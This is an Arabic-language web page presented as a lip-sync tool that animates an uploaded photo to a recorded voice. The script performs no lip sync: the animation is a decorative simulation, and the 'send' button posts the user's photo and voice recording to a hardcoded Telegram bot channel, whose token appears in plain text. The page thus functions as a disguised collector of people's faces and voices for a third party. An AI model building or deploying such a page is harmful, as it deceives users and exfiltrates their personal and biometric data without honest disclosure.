<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الصورة المتحركة الناطقة - Lip Sync</title>
    
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #1a0f2a, #2d1a4a);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 900px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #ff6b6b;
            font-size: 40px;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255,107,107,0.5);
        }

        /* بطاقة Lip Sync */
        .lipsync-card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border: 3px solid #ff6b6b;
            border-radius: 30px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 0 50px rgba(255,107,107,0.3);
        }

        .mouth-animation {
            font-size: 100px;
            animation: mouthMove 1s infinite alternate;
        }

        @keyframes mouthMove {
            0% { transform: scaleY(0.5); color: #ff6b6b; }
            100% { transform: scaleY(1.5); color: #ffd93d; }
        }

        /* النافذة الرئيسية */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(10px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: linear-gradient(135deg, #2d1a4a, #1a0f2a);
            border: 3px solid #ff6b6b;
            border-radius: 30px;
            padding: 40px;
            max-width: 700px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            position: relative;
        }

        .close-modal {
            position: absolute;
            top: 20px;
            left: 20px;
            background: none;
            border: none;
            color: #ff6b6b;
            font-size: 30px;
            cursor: pointer;
        }

        /* منطقة رفع الصورة */
        .upload-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }

        .upload-area {
            border: 3px dashed #ff6b6b;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .upload-area:hover {
            background: rgba(255,107,107,0.1);
        }

        .upload-area i {
            font-size: 50px;
            color: #ff6b6b;
            margin-bottom: 10px;
        }

        /* معاينة الصورة */
        .image-preview {
            margin-bottom: 20px;
            display: none;
        }

        .image-preview.show {
            display: block;
        }

        .image-preview img {
            width: 100%;
            max-height: 250px;
            border-radius: 15px;
            border: 3px solid #ff6b6b;
            object-fit: contain;
        }

        /* منطقة التسجيل الصوتي */
        .audio-recorder {
            background: rgba(255,107,107,0.1);
            border: 2px solid #ff6b6b;
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
        }

        .recorder-controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }

        .record-btn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: #ff6b6b;
            border: none;
            color: white;
            font-size: 30px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .record-btn.recording {
            background: #f44336;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .play-btn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: #4CAF50;
            border: none;
            color: white;
            font-size: 30px;
            cursor: pointer;
        }

        .audio-wave {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
            height: 50px;
            margin: 20px 0;
        }

        .wave-bar {
            width: 5px;
            height: 20px;
            background: #ff6b6b;
            animation: wave 0.5s infinite alternate;
        }

        @keyframes wave {
            0% { height: 10px; }
            100% { height: 40px; }
        }

        /* البصمة */
        .fingerprint-card {
            background: rgba(255,255,255,0.05);
            border: 2px solid #ff6b6b;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
        }

        .fingerprint-value {
            font-family: monospace;
            font-size: 24px;
            color: #ff6b6b;
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }

        .copy-btn {
            background: none;
            border: 2px solid #ff6b6b;
            color: #ff6b6b;
            padding: 10px 20px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 16px;
        }

        .copy-btn:hover {
            background: #ff6b6b;
            color: black;
        }

        /* زر الإرسال */
        .send-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #ff6b6b, #ff4757);
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }

        .send-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px #ff6b6b;
        }

        /* الإشعارات */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff6b6b, #ff4757);
            color: white;
            padding: 15px 25px;
            border-radius: 50px;
            font-weight: bold;
            z-index: 2000;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <i class="fas fa-face-smile-wink"></i>
                الصورة المتحركة الناطقة
                <i class="fas fa-microphone-lines"></i>
            </h1>
            <p>ارفع صورة + سجل صوت = فيديو متحرك بالشفاه</p>
        </div>

        <!-- زر الفتح -->
        <button class="send-btn" onclick="openLipSyncModal()" style="background: linear-gradient(135deg, #2d1a4a, #1a0f2a); border: 2px solid #ff6b6b;">
            <i class="fas fa-plus-circle"></i>
            إنشاء صورة ناطقة متحركة
        </button>
    </div>

    <!-- النافذة الرئيسية -->
    <div class="modal" id="lipsyncModal">
        <div class="modal-content">
            <button class="close-modal" onclick="closeModal()">&times;</button>
            
            <div class="modal-header" style="text-align: center; margin-bottom: 30px;">
                <i class="fas fa-film" style="font-size: 50px; color: #ff6b6b;"></i>
                <h2 style="color: #ff6b6b;">Lip Sync - مزامنة الشفاه</h2>
            </div>

            <!-- رفع الصورة -->
            <div class="upload-section">
                <div class="upload-area" onclick="document.getElementById('imageFile').click()">
                    <i class="fas fa-image"></i>
                    <h3>الصورة</h3>
                    <p>JPG, PNG, GIF</p>
                </div>
                
                <div class="upload-area" onclick="startRecording()">
                    <i class="fas fa-microphone"></i>
                    <h3>تسجيل صوت</h3>
                    <p>اضغط للتسجيل</p>
                </div>
            </div>

            <input type="file" id="imageFile" accept="image/*" style="display: none;" onchange="handleImageUpload(this)">

            <!-- معاينة الصورة -->
            <div class="image-preview" id="imagePreview">
                <img id="previewImage" src="" alt="المعاينة">
                <div style="display: flex; justify-content: space-between; margin-top: 10px;">
                    <span id="imageName"></span>
                    <i class="fas fa-times-circle" onclick="removeImage()" style="color: red; cursor: pointer;"></i>
                </div>
            </div>

            <!-- مسجل الصوت -->
            <div class="audio-recorder" id="audioRecorder">
                <div style="text-align: center; margin-bottom: 20px;">
                    <i class="fas fa-waveform" style="font-size: 40px; color: #ff6b6b;"></i>
                    <h3>التسجيل الصوتي</h3>
                </div>

                <!-- موجة صوتية متحركة (محاكاة لحركة الفم) -->
                <div class="audio-wave" id="audioWave">
                    <div class="wave-bar" style="animation-delay: 0s;"></div>
                    <div class="wave-bar" style="animation-delay: 0.1s;"></div>
                    <div class="wave-bar" style="animation-delay: 0.2s;"></div>
                    <div class="wave-bar" style="animation-delay: 0.3s;"></div>
                    <div class="wave-bar" style="animation-delay: 0.4s;"></div>
                    <div class="wave-bar" style="animation-delay: 0.5s;"></div>
                </div>

                <div class="recorder-controls">
                    <button class="record-btn" id="recordBtn" onclick="toggleRecording()">
                        <i class="fas fa-microphone"></i>
                    </button>
                    <button class="play-btn" id="playBtn" onclick="playAudio()" disabled>
                        <i class="fas fa-play"></i>
                    </button>
                </div>

                <div id="recordingStatus" style="text-align: center; color: #ff6b6b; margin-top: 10px;">
                    اضغط على الميكروفون للتسجيل
                </div>
            </div>

            <!-- البصمة -->
            <div class="fingerprint-card">
                <i class="fas fa-fingerprint" style="font-size: 30px; color: #ff6b6b;"></i>
                <h3>بصمة Lip Sync</h3>
                <div class="fingerprint-value" id="lipSyncThumbprint">LIP_1002_260313_...</div>
                <button class="copy-btn" onclick="copyThumbprint()">
                    <i class="fas fa-copy"></i> نسخ البصمة
                </button>
            </div>

            <!-- عنوان إضافي -->
            <div style="margin: 20px 0;">
                <label style="color: #ff6b6b;">العنوان:</label>
                <input type="text" id="postTitle" class="form-control" value="Lip Sync Video" style="width: 100%; padding: 10px; background: rgba(255,255,255,0.1); border: 2px solid #ff6b6b; border-radius: 10px; color: white;">
            </div>

            <!-- زر الإرسال -->
            <button class="send-btn" onclick="sendLipSync()">
                <i class="fas fa-paper-plane"></i>
                إرسال الفيديو الناطق
            </button>
        </div>
    </div>

    <script>
        // ========== إعدادات ==========
        const TELEGRAM = {
            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
            channelId: '-1003822964890'
        };

        // ========== متغيرات التسجيل ==========
        let mediaRecorder;
        let audioChunks = [];
        let audioBlob = null;
        let isRecording = false;
        let selectedImage = null;
        let currentThumbprint = '';

        // ========== فتح النافذة ==========
        function openLipSyncModal() {
            document.getElementById('lipsyncModal').style.display = 'flex';
            generateThumbprint();
        }

        // ========== إغلاق النافذة ==========
        function closeModal() {
            document.getElementById('lipsyncModal').style.display = 'none';
            resetAll();
        }

        // ========== توليد بصمة ==========
        function generateThumbprint() {
            const date = new Date();
            const timeStr = `${date.getHours().toString().padStart(2,'0')}${date.getMinutes().toString().padStart(2,'0')}${date.getSeconds().toString().padStart(2,'0')}`;
            currentThumbprint = `LIP_1002_${timeStr}`;
            document.getElementById('lipSyncThumbprint').textContent = currentThumbprint;
        }

        // تحديث البصمة كل ثانية
        setInterval(generateThumbprint, 1000);

        // ========== رفع الصورة ==========
        function handleImageUpload(input) {
            if (input.files && input.files[0]) {
                selectedImage = input.files[0];
                
                const reader = new FileReader();
                reader.onload = function(e) {
                    document.getElementById('previewImage').src = e.target.result;
                    document.getElementById('imagePreview').classList.add('show');
                    document.getElementById('imageName').textContent = selectedImage.name;
                }
                reader.readAsDataURL(selectedImage);
                
                showNotification('✅ تم رفع الصورة', 'success');
            }
        }

        function removeImage() {
            selectedImage = null;
            document.getElementById('imagePreview').classList.remove('show');
            document.getElementById('imageFile').value = '';
        }

        // ========== التسجيل الصوتي ==========
        async function toggleRecording() {
            if (!isRecording) {
                // بدء التسجيل
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream);
                    audioChunks = [];
                    
                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        document.getElementById('playBtn').disabled = false;
                        document.getElementById('recordingStatus').innerHTML = '✅ تم التسجيل! اضغط على Play للاستماع';
                        
                        // تفعيل حركة الفم
                        startMouthAnimation();
                    };
                    
                    mediaRecorder.start();
                    isRecording = true;
                    
                    document.getElementById('recordBtn').classList.add('recording');
                    document.getElementById('recordBtn').innerHTML = '<i class="fas fa-stop"></i>';
                    document.getElementById('recordingStatus').innerHTML = '🔴 جاري التسجيل...';
                    
                } catch (err) {
                    showNotification('❌ لا يمكن الوصول للميكروفون', 'error');
                }
            } else {
                // إيقاف التسجيل
                mediaRecorder.stop();
                mediaRecorder.stream.getTracks().forEach(track => track.stop());
                isRecording = false;
                
                document.getElementById('recordBtn').classList.remove('recording');
                document.getElementById('recordBtn').innerHTML = '<i class="fas fa-microphone"></i>';
            }
        }

        // ========== تشغيل الصوت المسجل ==========
        function playAudio() {
            if (audioBlob) {
                const audioUrl = URL.createObjectURL(audioBlob);
                const audio = new Audio(audioUrl);
                
                // تفعيل حركة الفم أثناء التشغيل
                audio.onplay = startMouthAnimation;
                audio.onended = stopMouthAnimation;
                
                audio.play();
            }
        }

        // ========== حركة الفم (محاكاة) ==========
        function startMouthAnimation() {
            const waves = document.querySelectorAll('.wave-bar');
            waves.forEach(wave => {
                wave.style.animation = 'wave 0.3s infinite alternate';
            });
        }

        function stopMouthAnimation() {
            const waves = document.querySelectorAll('.wave-bar');
            waves.forEach(wave => {
                wave.style.animation = 'wave 0.5s infinite alternate';
                wave.style.height = '20px';
            });
        }

        // ========== إرسال Lip Sync ==========
        async function sendLipSync() {
            if (!selectedImage) {
                showNotification('❌ الرجاء رفع صورة', 'error');
                return;
            }
            
            if (!audioBlob) {
                showNotification('❌ الرجاء تسجيل صوت', 'error');
                return;
            }

            showNotification('🔄 جاري إنشاء Lip Sync...', 'info');

            try {
                // نرسل الصورة أولاً
                const imageFormData = new FormData();
                imageFormData.append('chat_id', TELEGRAM.channelId);
                imageFormData.append('photo', selectedImage);
                imageFormData.append('caption', `🎬 Lip Sync Video\n🔍 البصمة: ${currentThumbprint}`);

                const imageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendPhoto`, {
                    method: 'POST',
                    body: imageFormData
                });

                const imageData = await imageResponse.json();

                if (imageData.ok) {
                    // نرسل الصوت بعد الصورة
                    const audioFormData = new FormData();
                    audioFormData.append('chat_id', TELEGRAM.channelId);
                    audioFormData.append('audio', audioBlob, 'speech.wav');
                    audioFormData.append('caption', `🔊 الصوت المصاحب للبصمة: ${currentThumbprint}`);

                    await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendAudio`, {
                        method: 'POST',
                        body: audioFormData
                    });

                    showNotification(`✅ تم إرسال Lip Sync بنجاح`, 'success');
                    
                    // رسالة التجميع
                    await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: TELEGRAM.channelId,
                            text: `🎯 **Lip Sync Complete**\n🔍 البصمة: ${currentThumbprint}\n\n⚠️ الصورة + الصوت تم إرسالهما منفصلين. لدمجهما استخدم برنامج مونتاج.`
                        })
                    });

                    setTimeout(() => closeModal(), 2000);
                } else {
                    throw new Error('فشل إرسال الصورة');
                }

            } catch (error) {
                showNotification('❌ فشل الإرسال', 'error');
                console.error(error);
            }
        }

        // ========== نسخ البصمة ==========
        function copyThumbprint() {
            navigator.clipboard.writeText(currentThumbprint);
            showNotification('✅ تم نسخ البصمة', 'success');
        }

        // ========== إعادة تعيين ==========
        function resetAll() {
            removeImage();
            audioBlob = null;
            audioChunks = [];
            document.getElementById('playBtn').disabled = true;
            document.getElementById('recordingStatus').innerHTML = 'اضغط على الميكروفون للتسجيل';
        }

        // ========== الإشعارات ==========
        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.innerHTML = message;
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 3000);
        }
    </script>
</body>
</html>
